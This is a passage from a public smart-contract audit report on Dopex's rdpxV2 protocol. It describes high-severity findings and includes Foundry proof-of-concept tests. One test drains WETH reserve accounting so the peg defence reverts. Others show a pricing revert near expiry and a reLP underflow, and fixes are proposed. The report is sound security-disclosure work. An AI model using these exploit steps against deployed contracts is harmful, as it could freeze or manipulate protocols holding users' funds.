functioncalculate(uint8optionType,uint256price,uint256strike,uint256timeToExpiry,uint256riskFreeRate,uint256volatility)internalpurereturns(uint256) {bytes16S=ABDKMathQuad.fromUInt(price);bytes16X=ABDKMathQuad.fromUInt(strike);bytes16T=ABDKMathQuad.div(ABDKMathQuad.fromUInt(timeToExpiry),ABDKMathQuad.fromUInt(36500)// 365 * 10 ^ DAYS_PRECISION);bytes16r=ABDKMathQuad.div(ABDKMathQuad.fromUInt(riskFreeRate),ABDKMathQuad.fromUInt(10000));bytes16v=ABDKMathQuad.div(ABDKMathQuad.fromUInt(volatility),ABDKMathQuad.fromUInt(100));bytes16d1=ABDKMathQuad.div(ABDKMathQuad.add(ABDKMathQuad.ln(ABDKMathQuad.div(S,X)),ABDKMathQuad.mul(ABDKMathQuad.add(r,ABDKMathQuad.mul(v,ABDKMathQuad.div(v,ABDKMathQuad.fromUInt(2)))),T)),ABDKMathQuad.mul(v,ABDKMathQuad.sqrt(T)));bytes16d2=ABDKMathQuad.sub(d1,ABDKMathQuad.mul(v,ABDKMathQuad.sqrt(T)));if(optionType==OPTION_TYPE_CALL) {returnABDKMathQuad.toUInt(ABDKMathQuad.mul(_calculateCallTimeDecay(S,d1,X,r,T,d2),ABDKMathQuad.fromUInt(DIVISOR)));}elseif(optionType==OPTION_TYPE_PUT) {returnABDKMathQuad.toUInt(ABDKMathQuad.mul(_calculatePutTimeDecay(X,r,T,d2,S,d1),ABDKMathQuad.fromUInt(DIVISOR)));}elsereturn0;}
The problem lies insidecalculatePremiumdue to not properly check if current time less than 864 seconds (around 14 minutes). becausegetOptionPricewill use time expiry in days multiply by 100.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/OptionPricingSimple.sol#L72
uint256timeToExpiry= (expiry*100) /86400;
IfnextFundingPaymentTimestamp() - block.timestampis less than 864 seconds, it will causetimeToExpiryinside option pricing is 0 and the call will always revert. This will cause an unexpected revert period around 14 minutes every funding epoch (in this case every week).
Foundry PoC :
Try to simulatecalculatePremiumwhennextFundingPaymentTimestamp() - block.timestampis less than 864 seconds.
Add this test toUnitcontract inside/tests/rdpxV2-core/Unit.t.sol, also addimport "forge-std/console.sol";andimport {OptionPricingSimple} from "contracts/libraries/OptionPricingSimple.sol";in the contract  :
functiontestOptionPricingRevert()public{OptionPricingSimpleoptionPricingSimple;optionPricingSimple=newOptionPricingSimple(100,5e6);(uint256rdpxRequired,uint256wethRequired) =rdpxV2Core.calculateBondCost(1*1e18,0);uint256currentPrice=vault.getUnderlyingPrice();// price of underlying wrt collateralTokenuint256strike=vault.roundUp(currentPrice- (currentPrice/4));// 25% below the current price// around 14 minutes before next funding paymentvm.warp(block.timestamp+7days-863seconds);uint256timeToExpiry=vault.nextFundingPaymentTimestamp() -block.timestamp;console.log("What is the current price");console.log(currentPrice);console.log("What is the strike");console.log(strike);console.log("What is time to expiry");console.log(timeToExpiry);uint256price=vault.getUnderlyingPrice();// will revertvm.expectRevert();optionPricingSimple.getOptionPrice(strike,price,100,timeToExpiry);}
Recommended Mitigation Steps
Set minimumtimeToExpiryinsidecalculatePremium:
function calculatePremium(uint256 _strike,uint256 _amount,uint256 timeToExpiry,uint256 _price) public view returns (uint256 premium) {premium = ((IOptionPricing(addresses.optionPricing).getOptionPrice(_strike,_price > 0 ? _price : getUnderlyingPrice(),getVolatility(_strike),-      timeToExpiry+      timeToExpiry < 864 ? 864 : timeToExpiry) * _amount) / 1e8);}
psytama (Dopex) confirmed and commented:
Modify time to expiry with a check for less than 864 seconds and make it more robust.
Alex the Entreprenerd (Judge) commented:
The DOS is not conditional on an external requirement because it consistently happens, I’ll ask judges, but am maintaining High Severity at this time.

[H-07] Incorrect precision assumed from RdpxPriceOracle creates multiple issues related to value inflation/deflation
Submitted byLokiThe5th, also found byminhtrng,QiuhaoLi, Udsen (1,2), 0xvj (1,2),josephdara,kutugu,Evo,0xTiwa,crunch,circlelooper,0xPsuedoPandit,Jiamin, gjaldon (1,2,3,4),Juntao,umarkhatab_465, hals (1,2),eeshenggoh,0xnev,T1MOH, andniki
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L372
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV2LiquidityAmo.sol#L381
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L539
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1160
TheRdpxEthPriceOracle, available in the audit repohere, provides theRdpxV2Core, theUniV2LiquidityAmoand thePerpetualAtlanticVaultcontracts the necessary values forrdpxrelated price calculations.
The issue is that these contracts expect the returned values to be in1e8precision (as stated in the natspechere,hereandhere). But the returned precisionis actually1e18.
This difference creates multiple issues throughout the below contracts:
ContractFunctionEffectrdpxV2Core.solgetRdpxPrice()Returns an1e18value when1e8expectedcalculateBondCost()Deflates therdpxRequiredcalculateAmounts()Inflates therdpxRequiredInWeth_transfer()InflatesrdpxAmountInWethand may cause possible underflowUniV2LiquidityAmogetLpPriceInEth()Overestimates the lp valueReLp.solreLP()Inflates min token amountsPerpetualAtlanticVault.solgetUnderlyingPrice()Returns1e18instead of1e8calculatePremium()Inflates the premium calculation
Proof of Concept
TheRdpxEthPriceOracle.solfile can be foundhere
It exposes the following functions used in the audit:
getLpPriceInEth()getRdpxPriceInEth()
These two functions provide the current price denominated inETH, with a precision in1e18, as confirmed by their respective natspec comments:
/// @dev Returns the price of LP in ETH in 1e18 decimalsfunction getLpPriceInEth() external view override returns (uint) {.../// @notice Returns the price of rDPX in ETH/// @return price price of rDPX in ETH in 1e18 decimalsfunction getRdpxPriceInEth() external view override returns (uint price) {
But, in the contracts from the audit repo, the business logic (and even the natspec) assumes the returned precision will be1e8. See below:
In theRdpxV2Corecontract the assumption that the price returned from the oracle is clearly noted in thenatspecof thegetRdpxPrice()function:
/*** @notice Returns the price of rDPX against ETH* @dev    Price is in 1e8 Precision* @return rdpxPriceInEth rDPX price in ETH**/function getRdpxPrice() public view returns (uint256) {returnIRdpxEthOracle(pricingOracleAddresses.rdpxPriceOracle).getRdpxPriceInEth();}
InUniV2LiquidityAmothe assumption is notedhere:
/*** @notice Returns the price of a rDPX/ETH Lp token against the alpha token* @dev    Price is in 1e8 Precision* @return uint256 LP price**/function getLpPrice() public view returns (uint256) {
And it has business logic implication here:
function getLpTokenBalanceInWeth() external view returns (uint256) {return (lpTokenBalance * getLpPrice()) / 1e8;}
InPerpetualAtlanticVaultit is notedhere:
/*** @notice Returns the price of the underlying in ETH in 1e8 precision* @return uint256 the current underlying price**/function getUnderlyingPrice() external view returns (uint256);
And the business logic implications in this contract are primarily found in thecalculatePremiumfunction, where the premium is divided by1e8:
function calculatePremium(uint256 _strike,uint256 _amount,uint256 timeToExpiry,uint256 _price) public view returns (uint256 premium) {premium = ((IOptionPricing(addresses.optionPricing).getOptionPrice(_strike,_price > 0 ? _price : getUnderlyingPrice(),getVolatility(_strike),timeToExpiry) * _amount) / 1e8);}
From the audit files it’s clear that the assumption was that the returned price would be in1e8, but this is Dopex’s ownRdpxPriceOracle, so was likely a simple oversight which slipped through testing as aMockRdpxEthPriceOraclewas implemented to simplify testing, which mocked the values from the oracle, but only to a1e8precision.
Recommended Mitigation Steps
For price feeds whereWETHwill be token B, it is convention (although not a standard, as far as the reviewer is aware), that the precision returned will be1e18. Seehere.
As the sponsor indicated that the team might move to Chainlink oracles, it is suggested to modify theRdpxV2Core,PerpetualAtlanticVault,UniV2Liquidityand theReLpcontracts to work with the returned1e18precision, assuming that the keep the token pair as rdpx/WETH.
psytama (Dopex) confirmed and commented:
The issue is in the oracle contract which returns 1e18.
Alex the Entreprenerd (Judge) commented:
Seems like the Warden grouped a bunch of consequences down to the root cause of the oracle precision.I’ll need to determine how to group / ungroup findings as there seem to be multple impacts but a single root cause.

[H-08] The peg stability module can be compromised by forcing lowerDepeg to revert
Submitted by0xrafaelnicolau, also found byHHK,koo,_eperezok,ubermensch,nobody2018,bart1e,peakbolt,0xnev,ElCid,HChang26,Vagner,max10afternoon,volodya,yashar,degensec,Krace,minhtrng,KrisApostolov,dimulski,0xc0ffEE,pontifex,Toshii,0xkazim,dethera,0xMosh,halden,mussucal,ether_sky,wintermute,bin2chen,QiuhaoLi,0xvj,Aymen0909,glcanvas,RED-LOTUS-REACH,gizzy,MiniGlome,Talfao,carrotsmuggler,ladboy233,Baki,hals,chainsnake,asui,Viktor_Cortess,Inspex,qbs,lanrebayode77,zaevlad,tapir,ABAIKUNANBAEV,dirk_y,gumgumzum,zzebra83, ravikiranweb3 (1,2),rvierdiiev,Nyx,kodyvim,Jorgect,Kow,deadrxsezzz,0xWaitress,0x111,atrixs6,said,LFGSecurity,0xCiphky,grearlake,Yanchuan, andchaduke
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110
In a scenario where extreme market conditions necessitate the execution of thelowerDepegfunction to restore the dpxETH/ETH peg, an attacker can exploit the flawed interaction between theaddToDelegate,withdraw, andsyncfunctions to force a revert on the admin’s attempt to restore the peg. As a result, the protocol will not be able to effectively defend the peg, leading to potential disruptions in the protocol’s peg stability module.
Proof of Concept
If 1 dpxETH < 1 ETH, therpdxV2Corecontract admin will call thelowerDepegfunction to restore the peg. The backing reserves are used to buy and burn dpxETH from the curve pool to bring back the peg to 1 ETH. An attacker can execute a transaction to manipulate the WETH reserves and cause the admin transaction to revert.
The attacker initiates the exploit by calling theaddToDelegatefunction, and depositing WETH intorpdxV2Corecontract. By doing so, the attacker effectively updates thetotalWethDelegatedstate variable, increasing it by the deposited amount.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L964
The attacker subsequently calls thewithdrawfunction, which does not update thetotalWethDelegatedstate variable. Consequently, thetotalWethDelegatedvariable retains the inflated value of WETH delegated, even though the WETH has neither been delegated nor it remains available, since it was withdrawn.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L975-L990
Finally, the attacker calls thesyncfunction which inaccurately updates the WETH reserves by subtracting the inflatedtotalWethDelegatedvalue. This manipulation artificially reduces the WETH reserves in the contract to a really small value or even zero.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1002
TherpdxV2Coreadmin calls thelowerDepegfunction to restore the dpxETH/ETH peg, which ultimately will revert due to an underflow error.
https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1110
Note that the attacker can loop through the process outlined in steps 1. and 2., thereby increasing thetotalWethDelegatedthrough a small input amount, before executing the sync function. As a result, this attack becomes financially inexpensive to execute.
// SPDX-License-Identifier: MITpragmasolidity0.8.19;import{Setup}from"./Setup.t.sol";import"../../lib/forge-std/src/console.sol";import"../../lib/forge-std/src/StdError.sol";contractExploitisSetup{functiontestExploitWETHReserves()external{// note: setupaddressuser1=address(0x1001);addressuser2=address(0x1002);weth.mint(address(user1),10ether);weth.mint(address(user2),10ether);rdpx.mint(address(user1),1000000ether);// user1 bondsvm.startPrank(user1);rdpx.approve(address(rdpxV2Core),type(uint256).max);weth.approve(address(rdpxV2Core),type(uint256).max);rdpxV2Core.bond(10ether,0,address(this));vm.stopPrank();// note: weth reserves manipulation// gets the reserve of WETH in the core contractvm.startPrank(user2);(,uint256wethReserveBefore,) =rdpxV2Core.getReserveTokenInfo("WETH");console.log("WETH reserve before: ",wethReserveBefore);// approve rpdxV2Core to spend WETHweth.approve(address(rdpxV2Core),type(uint256).max);// delegate WETH, and assert it was delegateduint256delegateId=rdpxV2Core.addToDelegate(wethReserveBefore,1e8);assertTrue(rdpxV2Core.totalWethDelegated() ==wethReserveBefore);// withdraw WETH, assert WETH was withdrawn but it still says WETH is delegatedrdpxV2Core.withdraw(delegateId);assertTrue(rdpxV2Core.totalWethDelegated() ==wethReserveBefore);// assert that the user2 has the same balance he had beforeassertTrue(weth.balanceOf(user2) ==10ether);// call sync and make WETH reserves -= WETH delegatedrdpxV2Core.sync();// check the amount of WETH in reserves after and assert it is smaller than before(,uint256wethReserveAfter,) =rdpxV2Core.getReserveTokenInfo("WETH");assertTrue(wethReserveBefore-rdpxV2Core.totalWethDelegated() ==wethReserveAfter);console.log("WETH reserve after:  ",wethReserveAfter);vm.stopPrank();// note: admin tries to defend the peg.// update the dpxETH price to simulate 1 dpxETH < 1 ETHdpxEthPriceOracle.updateDpxEthPrice(98137847);// expect the transaction to revert with an underflow.vm.expectRevert(stdError.arithmeticError);rdpxV2Core.lowerDepeg(0,10ether,0,0);}
Tools Used
Foundry
Recommended Mitigation Steps
Update the totalWethDelegated in thewithdrawfunction.
functionwithdraw(uint256delegateId)externalreturns(uint256amountWithdrawn) {_whenNotPaused();_validate(delegateId<delegates.length,14);Delegatestoragedelegate=delegates[delegateId];_validate(delegate.owner==msg.sender,9);amountWithdrawn=delegate.amount-delegate.activeCollateral;_validate(amountWithdrawn>0,15);delegate.amount=delegate.activeCollateral;+totalWethDelegated-=amountWithdrawn;IERC20WithBurn(weth).safeTransfer(msg.sender,amountWithdrawn);emitLogDelegateWithdraw(delegateId,amountWithdrawn);}
Alex the Entreprenerd (Judge) commented:
Best + explains why it’s high.
psytama (Dopex) confirmed via duplicate issue 2186

[H-09]ReLPContractwrongfully assumes protocol owns all of the liquidity in the UniswapV2 pool
Submitted bydeadrxsezzz, also found bykutugu,said,QiuhaoLi,0xMango,pep7siup, and0xDING99YA
Possible full DoS forReLPContract
Proof of Concept
When taking out abondinRdpxV2CoreifisReLPActive == true, a call toReLPContract#reLPis made which ‘re-LPs the pool` (takes out an amount of RDPX, while still perfectly maintaining the token ratio of the pool).
(uint256reserveA,uint256reserveB) =UniswapV2Library.getReserves(// @audit - here it gets the reserves of the pool and assumes them as owned by the protocoladdresses.ammFactory,tokenASorted,tokenBSorted);TokenAInfomemorytokenAInfo=TokenAInfo(0,0,0);// get tokenA reservestokenAInfo.tokenAReserve=IRdpxReserve(addresses.tokenAReserve).rdpxReserve();// rdpx reserves// get rdpx pricetokenAInfo.tokenAPrice=IRdpxEthOracle(addresses.rdpxOracle).getRdpxPriceInEth();tokenAInfo.tokenALpReserve=addresses.tokenA==tokenASorted?reserveA:reserveB;uint256baseReLpRatio= (reLPFactor*Math.sqrt(tokenAInfo.tokenAReserve) *1e2) / (Math.sqrt(1e18));// 1e6 precisionuint256tokenAToRemove= ((((_amount*4) *1e18) /tokenAInfo.tokenAReserve) *tokenAInfo.tokenALpReserve*// @audit - here the total RDPX reserve in the pool is assumed to be owned by the protocolbaseReLpRatio) / (1e18*DEFAULT_PRECISION*1e2);uint256totalLpSupply=IUniswapV2Pair(addresses.pair).totalSupply();uint256lpToRemove= (tokenAToRemove*totalLpSupply) /tokenAInfo.tokenALpReserve;
The problem is that the protocol wrongfully assumes that it owns all of the liquidity within the pool. This leads to faulty calculations. In best case scenario wrong amounts are passed. However, when the protocol doesn’t own the majority of the pool LP balance, this could lead to full DoS, aslpToRemovewill be calculated to be more than the LP balance ofUniV2LiquidityAmoand the transaction will revert.
This can all be easily proven by a simple PoC (add the test to the givenPeriphery.t.sol)
Note: there’s an addedconsole.loginReLPContract#reLP, just before thetransferFromin order to better showcase the issue
uint256lpToRemove= (tokenAToRemove*totalLpSupply) /tokenAInfo.tokenALpReserve;console.log("lpToRemove value:    ",lpToRemove);// @audit - added console.log to prove the underflow// transfer LP tokens from the AMOIERC20WithBurn(addresses.pair).transferFrom(addresses.amo,address(this),lpToRemove);
functiontestReLpContract()public{testV2Amo();// set address in reLP contract and grant rolereLpContract.setAddresses(address(rdpx),address(weth),address(pair),address(rdpxV2Core),address(rdpxReserveContract),address(uniV2LiquidityAMO),address(rdpxPriceOracle),address(factory),address(router));reLpContract.grantRole(reLpContract.RDPXV2CORE_ROLE(),address(rdpxV2Core));reLpContract.setreLpFactor(9e4);// add liquidityuniV2LiquidityAMO.addLiquidity(5e18,1e18,0,0);uniV2LiquidityAMO.approveContractToSpend(address(pair),address(reLpContract),type(uint256).max);rdpxV2Core.setIsreLP(true);(uint256reserveA,uint256reserveB, ) =pair.getReserves();weth.mint(address(2),reserveB*10);rdpx.mint(address(2),reserveA*10);vm.startPrank(address(2));weth.approve(address(router),reserveB*10);rdpx.approve(address(router),reserveA*10);router.addLiquidity(address(rdpx),address(weth),reserveA*10,reserveB*10,0,0,address(2),12731316317831123);vm.stopPrank();console.log("UniV2Amo balance isn't enough and will underflow");uintpairBalance=pair.balanceOf(address(uniV2LiquidityAMO));console.log("UniV2Amo LP balance: ",pairBalance);vm.expectRevert("ds-math-sub-underflow");rdpxV2Core.bond(1*1e18,0,address(this));}
And the logs:
[PASS] testReLpContract() (gas: 3946961)Logs:UniV2Amo balance isn't enough and will underflowUniV2Amo LP balance:  2235173550604750304lpToRemove value:     17832559500122488916
Recommended Mitigation Steps
Change the logic and base all calculations on the pair balance ofUniV2LiquidityAmo
psytama (Dopex) confirmed and commented:
The re-LP formula used is incorrect.
Alex the Entreprenerd (Judge) commented:
The incorrect assumption does indeed cause reverts.

